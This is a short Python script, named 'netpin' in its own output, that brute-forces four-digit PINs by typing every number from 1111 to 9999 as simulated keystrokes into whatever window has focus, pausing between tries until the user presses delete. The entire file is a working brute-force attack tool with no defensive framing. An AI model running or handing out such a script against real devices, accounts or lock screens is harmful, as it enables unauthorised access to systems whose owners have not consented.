import keyboard, time, os, argparse

parser = argparse.ArgumentParser()
parser.add_argument("--speed", help="speed of the pin cracker, setting to 0 might bug out, based in seconds(Default: 0.5)")
args = parser.parse_args()

#Pass args to variables
speed = args.speed

#Check args
if speed == None:
    speed = 0.5

print("[*] Beginning pin cracker in 5 seconds")
time.sleep(5)

for x in range(1111, 10000):
    if keyboard.is_pressed('delete') == 0:
        print("[*] Trying pin: " + str(x))
        keyboard.write(str(x)[0])
        keyboard.write(str(x)[1])
        keyboard.write(str(x)[2])
        keyboard.write(str(x)[3])
        time.sleep(float(speed))
    else:
        print("[!] Program stopped by user")
        print("[*] Thanks for using netpin")
        break
